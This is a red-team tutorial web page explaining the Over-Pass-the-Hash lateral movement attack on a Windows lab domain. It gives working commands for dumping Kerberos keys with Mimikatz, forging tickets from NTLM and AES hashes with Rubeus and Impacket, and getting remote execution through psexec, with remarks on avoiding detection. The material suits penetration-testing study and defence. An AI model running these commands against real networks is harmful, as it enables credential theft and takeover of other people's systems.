<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/lateral-movement/" rel="category tag">Lateral Movement</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Lateral Movement: Over Pass the Hash</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/" rel="bookmark"><time class="entry-date published" datetime="2020-05-14T17:49:17+00:00">May 14, 2020</time><time class="updated" datetime="2025-05-14T16:57:55+00:00">May 14, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this post, weâ€™re going to talk about Over Pass the hash that added another step in passing the hash. Pass the hash is an attack that allows an intruder to authenticate as a user without having access to the userâ€™s password. This is a technique where an attacker uses the NTLM hashes for authentication and bypass the standard authentication step clear text password for login, for more detail read from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/">here</a>.</strong></span></span></p>
<p><span style="color: #000000;">Over Pass the hash is a combination of passing the hash and passing the ticket, so itâ€™s called Over Pass the hash. Allows the creation of Kerberos tickets from NTLM hash or AES keys that allow access to the resource service that required Kerberos authentication.</span></p>
<p><span style="color: #000000;">In Kerberos authentication NTLM (RC4), AES128, AES256 key is used to encrypt the timestamp.</span></p>
<h3><span style="color: #800000;">Required Tools</span></h3>
<ul>
<li><span style="color: #000000;">Mimikatz</span></li>
<li><span style="color: #000000;">Rubeus</span></li>
<li><span style="color: #000000;">Impacket</span></li>
</ul>
<p><span style="color: #000000;">Letâ€™s take a look!!! ðŸ˜Š</span></p>
<h3><span style="color: #800000;">Mimikatz</span></h3>
<p><span style="color: #000000;">To perform over pass the ticket we are going to use mimikatzÂ  and Install it on the host machine and type the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
sekurlsa::ekeys</pre>
<p><span style="color: #000000;">With the help of ekeys you will able to fetch all keys NTLM (RC4), AES128, AES256 key</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-3IRon9i5vgk/Xr2CEqnoDzI/AAAAAAAAkEc/EfufqsW4HuosocqhU9252kg2kVGhRZ_NgCLcBGAsYHQ/s1600/1.png" alt="Lateral Movement using Pass the Hash" width="791" height="833"/></span></p>
<p><span style="color: #000000;">So with the help of sekurlsa::pth command we try to use ase256 key or aes128 for Kerberos ticket, it is difficult to detect because it is the more common and secure key used in encryption.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sekurlsa::pth /user:Administrator /domain:ignite.local /aes256:9c83452b5dcdca4b0bae7e89407c700bed3153c31dca06a8d7be29d98e13764c
sekurlsa::pth /user:Administrator /domain:ignite.local /aes128:b5c9a38d8629e87f5da0a0ff2c67f84c</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-CZSJ1ANwlb0/Xr2CE5dp20I/AAAAAAAAkEk/2aBj5RwgaYYl7OLrQbDcxS39vqQAQpVbACLcBGAsYHQ/s1600/2.png" alt="Lateral Movement using Pass the Hash" width="857" height="742"/></span></p>
<p><span style="color: #000000;">If you will use NTLM (RC4), ASE128, ASE256 simultaneously for injecting into Kerberos ticket, this step is more secure and undetectable in the network.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sekurlsa::pth /user:Administrator /domain:igntie.local /ntlm:a29f7623fd11550def0192de9246f46b /aes128:b5c9a38d8629e87f5da0a0ff2c67f84c /aes256:9c83452b5dcdca4b0bae7e89407c700bed3153c31dca06a8d7be29d98e13764c
sekurlsa::pth /user:Administrator /domain:igntie.local /ntlm:a29f7623fd11550def0192de9246f46b</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FG1oXr3yAuA/Xr2CE-xk4aI/AAAAAAAAkEg/JMXCC8uwZtYJdGhxi-XHpnQZWG7rb2KLACLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">And once it will done you will be able to access the authorized resource as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-XnFG6SdZ2pI/Xr2CFTJVyqI/AAAAAAAAkEo/-C8EeKMFgMsDX9kKjT7sVXzsqwm_R0EnACLcBGAsYHQ/s1600/5.png" alt="Lateral Movement using Pass the Hash" width="572" height="260"/></span></p>
<h3><span style="color: #800000;"><strong>Rubeus.exe </strong></span></h3>
<p><span style="color: #000000;">As I have already mentioned in the previous article that this tool is awesome because it is easy to use and directly run on the local environment of the victim machine.</span></p>
<p><span style="color: #000000;">Download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/GhostPack/Rubeus">here</a></strong></span></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Rubeus.exe asktgt /domain:igntie.local /user:Administrator /rc4: 32196b56ffe6f45e294117b91a83bf38 /ptt</pre>
<p><span style="color: #000000;">Using rc4 hash it will not only pass the hash infect pass the ticket and you will be able o access the resource.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dir \\WIN-S0V7KMTVLD2\c$</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-l2Tf8Blj41M/Xr2CFqcCUdI/AAAAAAAAkEs/hfvKXYg4CYUpK_c020dbb7xCEzoM0FXxwCLcBGAsYHQ/s1600/6.png"/></span></p>
<h3><span style="color: #800000;"><strong>Impacket </strong></span></h3>
<p><span style="color: #000000;">I wish to execute this attack remotely then use impacket python script <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py">gettgt.py</a></strong></span> which will use a password, hash or aesKey, it will request a TGT and save it as ccache.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python getTGT.py -dc-ip 192.168.1.105 -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/Administrator</pre>
<p><span style="color: #000000;">with the help of above command, you will be able to request Kerberos authorized ticket in the form of ccache whereas with the help of the following command you will be able to inject the ticket to access the resource.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=Administrator.ccache; psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/Administrator@WIN-S0V7KMTVLD2.ignite.loca</pre>
<p><span style="color: #000000;"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-juAW73nUZu4/Xr2CFxSxE5I/AAAAAAAAkEw/R6R3Aw25uZIaKXVeESaIEDjcO7SH7eg1wCLcBGAsYHQ/s1600/7.png" alt="Lateral Movement using Pass the Hash" width="886" height="346"/></strong></span></p>
<p><span style="color: #000000;"><strong>Conclusion:</strong> As you have seen, we try to use three different tools to conduct Over-Pass-The-Hash locally and remotely that not only pass the hash but also inject hash for Kerberos authentication to get the ticket.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong>Â is a Technical Writer, Researcher and Penetration Tester. Can be Contacted onÂ <strong>Twitter</strong>Â andÂ <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
